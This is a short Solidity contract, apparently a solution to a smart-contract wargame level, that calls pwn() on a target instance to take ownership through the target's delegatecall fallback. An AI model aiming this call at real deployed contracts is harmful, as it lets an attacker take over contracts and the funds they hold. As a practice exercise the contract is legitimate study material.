// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract Hacklation {
    address public owner;
    address public instance;

    constructor(address _instance) public {
        owner = msg.sender;
        instance = _instance;
    }

    function kill() public {
        (bool result, bytes memory data) = instance.call(abi.encodeWithSignature('pwn()'));
       
    }
}